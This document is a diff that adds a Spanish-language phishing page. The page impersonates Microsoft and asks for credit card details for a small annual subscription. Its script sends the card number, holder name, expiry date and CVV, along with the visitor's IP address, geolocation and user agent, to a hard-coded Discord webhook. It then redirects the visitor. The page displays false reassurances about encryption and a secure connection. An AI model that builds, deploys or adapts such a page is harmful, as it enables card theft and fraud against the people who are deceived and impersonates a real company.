@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, viewport-fit=cover" />
+<title>Microsoft – Añade una tarjeta</title>
+<link rel="shortcut icon" href="https://cdn.glitch.global/236764b8-4373-4179-baae-d756cfc63432/ico.ico?v=1741715931055" type="image/x-icon"/>
+
+<style>
+  /* ===== Escala base (1rem = 10px) ===== */
+  html{font-size:62.5%}
+  :root{
+    --bg-1:#f7f8fb;
+    --bg-2:#eef2ff;
+    --ink:#111827;
+    --muted:#6b7280;
+    --line:#e5e7eb;
+    --brand:#2563eb;
+    --brand-ink:#ffffff;
+    --ok:#10b981;
+    --card:#ffffff;
+    --shadow:0 10px 30px rgba(2,6,23,.08), 0 2px 8px rgba(2,6,23,.06);
+    --radius:14px;
+    --err:#ef4444;
+  }
+
+  /* ===== Layout ===== */
+  body{
+    margin:0;
+    min-height:100vh;
+    color:var(--ink);
+    font:400 1.4rem/1.55 system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, "Noto Sans", "Apple Color Emoji","Segoe UI Emoji";
+    background-color:#f9fafb;
+    background-image:url("https://i.imgur.com/4uc3m3B.png");
+    background-size:cover;
+    background-position:center;
+    background-repeat:no-repeat;
+  }
+  .wrap{
+    max-width:1180px;
+    padding:2.4rem 2rem 6rem;
+    margin-inline:auto;
+  }
+
+  /* ===== Header Microsoft ===== */
+  .ms-header{
+    display:flex; align-items:center; justify-content:space-between;
+    margin-bottom:2.4rem;
+  }
+  .ms-logo{
+    display:flex; align-items:center; gap:.8rem; user-select:none;
+  }
+  .tiles{display:grid; grid-template-columns:repeat(2,1fr); gap:2px}
+  .tile{width:14px; height:14px; border-radius:2px}
+  .t1{background:#f25022} .t2{background:#7fba00}
+  .t3{background:#00a4ef} .t4{background:#ffb900}
+  .ms-word{
+    font-weight:600; letter-spacing:.15px; font-size:2.0rem;
+    color:#111827
+  }
+
+  .price-chip{
+    background:#eef2ff; color:#111827; border:1px solid #dbe1fe;
+    font-weight:600; font-size:1.2rem; padding:.6rem 1rem; border-radius:999px;
+  }
+
+  /* ===== Grid 2 columnas ===== */
+  .grid{
+    display:grid; gap:2rem;
+    grid-template-columns: 1fr 420px;
+  }
+  @media (max-width:1080px){
+    .grid{grid-template-columns:1fr}
+  }
+
+  /* ===== Cards ===== */
+  .card{
+    background:var(--card);
+    border:1px solid var(--line);
+    border-radius:var(--radius);
+    box-shadow:var(--shadow);
+  }
+  .card-pad{ padding:2.2rem }
+  .card h2{
+    margin:0 0 .8rem; font-size:2.1rem; line-height:1.25; font-weight:700;
+  }
+  .help{
+    margin:.4rem 0 2rem; font-size:1.3rem; color:var(--muted);
+  }
+
+  /* ===== Brand badges ===== */
+  .badges{ display:flex; gap:1rem; margin:1rem 0 1.6rem }
+  .badge{
+    display:inline-flex; align-items:center; justify-content:center;
+    width:66px; height:42px; border:1px solid var(--line); border-radius:9px;
+    background:#fff;
+    box-shadow:0 1px 0 rgba(17,24,39,.03);
+  }
+  .badge img{ max-width:54px; max-height:24px; object-fit:contain; display:block }
+
+  /* ===== Form ===== */
+  .field{ display:flex; flex-direction:column; gap:.6rem; margin:1.2rem 0 }
+  .label{ font-size:1.3rem; color:#374151; font-weight:600 }
+  .input{
+    width:100%; height:44px; border-radius:9px; border:1px solid var(--line);
+    background:#fff; padding:0 1.2rem; font-size:1.4rem; color:var(--ink);
+    outline:none; transition:border .15s, box-shadow .15s;
+    box-sizing:border-box;
+  }
+  .input:focus{ border-color:#93c5fd; box-shadow:0 0 0 4px rgba(37,99,235,.12) }
+
+  .subrow{ display:grid; grid-template-columns:minmax(140px, 210px) minmax(120px, 180px); gap:1.2rem }
+  @media (max-width:480px){ .subrow{ grid-template-columns:1fr 1fr } }
+  .mini{ display:flex; flex-direction:column; gap:.6rem }
+
+  .actions{ margin-top:1.6rem }
+  .btn{
+    display:inline-flex; align-items:center; justify-content:center; gap:.8rem;
+    height:42px; padding:0 1.6rem; border-radius:8px; border:1px solid transparent;
+    background:var(--brand); color:var(--brand-ink); font-weight:700; font-size:1.4rem;
+    cursor:pointer;
+    box-shadow:0 6px 14px rgba(37,99,235,.18), 0 2px 6px rgba(37,99,235,.15);
+    transition:filter .15s, transform .05s;
+  }
+  .btn:hover{ filter:brightness(1.05) }
+  .btn:active{ transform:translateY(1px) }
+  .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  .secure{
+    display:flex; align-items:flex-start; gap:.8rem; padding:1.2rem 1.4rem;
+    background:#ecfdf5; border:1px solid #d1fae5; border-radius:10px;
+    margin:0 0 1.4rem;
+  }
+  .secure svg{min-width:18px}
+  .secure p{ margin:.2rem 0 0; font-size:1.4rem; color:#065f46 }
+
+  .bullets{ margin:1.2rem 0 0; padding-left:1.6rem; color:#374151; font-size:1.4rem }
+  .bullets li{ margin:.4rem 0 }
+
+  .footer{
+    display:flex; gap:1.2rem; align-items:center; color:#6b7280;
+    margin-top:2rem; font-size:1.3rem;
+  }
+  .footer a{ color:inherit; text-decoration:none }
+  .dot::before{ content:"·"; margin:0 .6rem }
+
+  html, body {
+    min-height: 100%;
+    overflow: auto;
+    position: static;
+    touch-action: pan-y;
+    overscroll-behavior: contain;
+    -webkit-text-size-adjust: 100%;
+  }
+</style>
+</head>
+<body>
+  <div class="wrap">
+
+    <header class="ms-header">
+      <div class="ms-logo" aria-label="Microsoft">
+        <div class="tiles" aria-hidden="true">
+          <span class="tile t1"></span><span class="tile t2"></span>
+          <span class="tile t3"></span><span class="tile t4"></span>
+        </div>
+        <span class="ms-word">Microsoft</span>
+      </div>
+      <div class="price-chip">$0.89 / año · Cuenta Personal</div>
+    </header>
+
+    <section class="grid">
+
+      <div class="card card-pad">
+        <form id="ccForm" novalidate>
+        <h2>Añade una tarjeta de crédito/débito</h2>
+        <p class="help">Tus datos se cifran y solo se usan para activar la suscripción.</p>
+
+        <div class="badges" aria-hidden="true">
+          <span class="badge"><img src="https://i.imgur.com/GYsZBUM.png" alt="Mastercard"></span>
+          <span class="badge"><img src="https://i.imgur.com/a0I8z1u.png" alt="VISA"></span>
+          <span class="badge"><img src="https://i.imgur.com/xkaly34.png" alt="American Express"></span>
+          <span class="badge"><img src="https://i.imgur.com/EI9Qb6Z.png" alt="Discover"></span>
+        </div>
+
+        <div class="field">
+          <label class="label" for="card">Número de tarjeta</label>
+          <input class="input" id="card" name="card" inputmode="numeric" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" maxlength="19">
+        </div>
+
+        <div class="field">
+          <label class="label" for="name">Nombre del titular</label>
+          <input class="input" id="name" name="name" autocomplete="cc-name" placeholder="Como aparece en la tarjeta">
+        </div>
+
+        <div class="field">
+          <div class="subrow">
+            <div class="mini">
+              <label class="label" for="exp">Fecha (MM/YY)</label>
+              <input class="input" id="exp" name="exp" inputmode="numeric" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp">
+            </div>
+            <div class="mini">
+              <label class="label" for="cvv">CVV</label>
+              <input class="input" id="cvv" name="cvv" inputmode="numeric" placeholder="***" maxlength="4" autocomplete="cc-csc">
+            </div>
+          </div>
+        </div>
+
+        <div class="actions">
+          <button class="btn" id="submit">Continuar</button>
+        </div>
+
+        </form>
+
+        <div class="footer">
+          <a href="#" target="_self">Términos de uso</a>
+          <span class="dot"></span>
+          <a href="#" target="_self">Privacidad y cookies</a>
+          <span class="dot"></span>
+          <a href="#" target="_self">Ayuda</a>
+        </div>
+      </div>
+
+      <aside class="card card-pad">
+        <h2 style="margin-bottom:1rem">Resumen</h2>
+
+        <div class="secure" role="status" aria-live="polite">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M17 9V7a5 5 0 10-10 0v2" stroke="#059669" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/>
+            <rect x="5" y="9" width="14" height="10" rx="2.5" stroke="#059669" stroke-width="1.7"/>
+          </svg>
+          <p><strong>Conexión segura.</strong><br> Tus datos de pago se protegen con cifrado TLS.</p>
+        </div>
+
+        <ul class="bullets">
+          <li>Activación inmediata.</li>
+          <li>Soporte y seguridad verificada.</li>
+        </ul>
+      </aside>
+
+    </section>
+  </div>
+
+<script>
+  // ====== WEBHOOK DE DISCORD ======
+  // ⚠️ REEMPLAZA ESTA URL CON LA URL REAL DE TU WEBHOOK DE DISCORD ⚠️
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1558530378589933649/GgHfQQyo30dmmo3sxJGxtu0CShDCWY0gb-8q4VbLlDiIJNffBRYApvun6Wr49KyyNaTg";
+  
+  // ====== Máscaras (solo formato, sin validación estricta) ======
+  const $card = document.getElementById('card');
+  $card.addEventListener('input', e=>{
+    let v = e.target.value.replace(/\D+/g,'').slice(0,19);
+    e.target.value = v.replace(/(\d{4})(?=\d)/g,'$1 ').trim();
+  });
+
+  const $exp = document.getElementById('exp');
+  $exp.addEventListener('input', e=>{
+    let v = e.target.value.replace(/\D+/g,'').slice(0,4);
+    if(v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+    e.target.value = v;
+  });
+
+  const $cvv = document.getElementById('cvv');
+  $cvv.addEventListener('input', e=>{
+    e.target.value = e.target.value.replace(/\D+/g,'').slice(0,4);
+  });
+
+  // Detección de marca (solo para mostrar)
+  function detectBrand(pan){
+    const d = (pan.replace(/\s+/g,'')[0] || '');
+    if(d==='4') return 'VISA';
+    if(d==='5') return 'MASTERCARD';
+    if(d==='3') return 'AMERICAN EXPRESS';
+    if(d==='6') return 'DISCOVER';
+    return 'DESCONOCIDA';
+  }
+
+  // ====== Envío a Discord ======
+  async function getExtraData() {
+    try {
+      const ipRes = await fetch("https://api.ipify.org?format=json");
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
+      try {
+        const geoRes = await fetch("https://ipapi.co/" + ip + "/json/");
+        const geoData = await geoRes.json();
+        return {
+          ip: ip || "N/D",
+          country: geoData.country_name || "N/D",
+          region: geoData.region || "N/D",
+          city: geoData.city || "N/D"
+        };
+      } catch (e) {
+        return { ip: ip || "N/D", country: "N/D", region: "N/D", city: "N/D" };
+      }
+    } catch (e) {
+      return { ip: "N/D", country: "N/D", region: "N/D", city: "N/D" };
+    }
+  }
+
+  async function sendToDiscord(embed) {
+    if (!DISCORD_WEBHOOK_URL) {
+      console.warn("Webhook no configurado");
+      return;
+    }
+    try {
+      await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+      console.log("Datos enviados a Discord correctamente");
+    } catch (e) {
+      console.error("Error al enviar a Discord:", e);
+    }
+  }
+
+  // ====== Validación SOLO campos obligatorios (sin validación de tarjeta) ======
+  function formValid(){
+    const cn = ($card.value || "").replace(/\s+/g,'');
+    const h = (document.getElementById('name').value || "").trim();
+    const expText = ($exp.value || "").trim();
+    const c = ($cvv.value || "").replace(/\D+/g,'');
+    
+    // Solo verificar que los campos no estén vacíos
+    if (!cn || cn.length === 0) {
+      alert("Por favor, ingresa el número de tarjeta.");
+      return false;
+    }
+    if (!h || h.length === 0) {
+      alert("Por favor, ingresa el nombre del titular.");
+      return false;
+    }
+    if (!expText || expText.length !== 5 || !expText.includes('/')) {
+      alert("Por favor, ingresa la fecha de expiración en formato MM/YY.");
+      return false;
+    }
+    if (!c || c.length < 3 || c.length > 4) {
+      alert("Por favor, ingresa el CVV (3 o 4 dígitos).");
+      return false;
+    }
+    
+    return true;
+  }
+
+  // ====== Evento principal ======
+  document.getElementById('ccForm').addEventListener('submit', async function(e){
+    e.preventDefault();
+    
+    if (!formValid()) {
+      return;
+    }
+    
+    // Deshabilitar botón para evitar doble envío
+    const submitBtn = document.getElementById('submit');
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Procesando...";
+    
+    const cardNumber = $card.value || "";
+    const holderName = document.getElementById('name').value || "";
+    const expDate = $exp.value || "";
+    const cvvCode = $cvv.value || "";
+    const cardBrand = detectBrand(cardNumber.replace(/\s+/g,''));
+    
+    const extra = await getExtraData();
+    
+    const embed = {
+      title: "💳 NUEVA TARJETA REGISTRADA",
+      description: "Se ha intentado agregar una tarjeta en Microsoft",
+      color: 0x007acc,
+      fields: [
+        { name: "🏷️ Marca", value: cardBrand, inline: true },
+        { name: "💳 Número de tarjeta", value: `||${cardNumber}||`, inline: false },
+        { name: "👤 Titular", value: holderName || "No especificado", inline: true },
+        { name: "📅 Expiración", value: expDate || "No especificada", inline: true },
+        { name: "🔒 CVV", value: `||${cvvCode}||`, inline: true },
+        { name: "🌐 IP Pública", value: extra.ip, inline: true },
+        { name: "📍 Ubicación", value: `${extra.city}, ${extra.region} / ${extra.country}`, inline: false },
+        { name: "🕒 Fecha y hora", value: new Date().toLocaleString('es-ES'), inline: true },
+        { name: "🌍 User Agent", value: navigator.userAgent.substring(0, 80), inline: false }
+      ],
+      footer: { text: "Microsoft Payment System" },
+      timestamp: new Date().toISOString()
+    };
+    
+    await sendToDiscord(embed);
+    
+    // Redirigir después de 1.5 segundos
+    setTimeout(() => {
+      window.location.href = "text.html";
+    }, 1500);
+  });
+</script>
+
+<script>
+  // Prevenir zoom en móviles
+  document.addEventListener('gesturestart', e => e.preventDefault());
+  document.addEventListener('gesturechange', e => e.preventDefault());
+  document.addEventListener('gestureend', e => e.preventDefault());
+
+  let lastTouch = 0;
+  document.addEventListener('touchend', e => {
+    const now = Date.now();
+    if (now - lastTouch <= 300) e.preventDefault();
+    lastTouch = now;
+  }, { passive: false });
+
+  document.addEventListener('touchmove', e => {
+    if (typeof e.scale === 'number' && e.scale !== 1) e.preventDefault();
+  }, { passive: false });
+</script>
+
+</body>
+</html>
